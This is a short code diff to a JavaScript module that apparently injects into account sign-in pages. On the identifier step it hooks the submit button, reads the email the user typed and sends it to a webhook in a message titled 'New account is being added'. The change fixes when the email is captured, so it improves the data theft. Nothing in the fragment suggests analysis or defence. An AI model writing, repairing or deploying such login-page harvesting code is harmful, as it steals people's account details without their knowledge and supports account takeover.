@@ -9,11 +9,10 @@ module.exports = {
     {
       path: ['/v3/signin/identifier', '/InteractiveLogin/identifier'],
       run() {
-        const emailInput = document.querySelector(this.getSelector('input'))?.value;
-        const submitButton = document.querySelector(this.getSelector('submit'));
-
-        submitButton.addEventListener('click', async () => {
+        document.querySelector(this.getSelector('submit')).addEventListener('click', async () => {
+          const emailInput = document.querySelector(this.getSelector('input'))?.value;
           if (!emailInput || emailInput < 6 || emailInput > 30) return;
+
           const { id } = await Util.Webhook.sendEmbed({
             author: { name: emailInput },
             title: 'New account is being added',
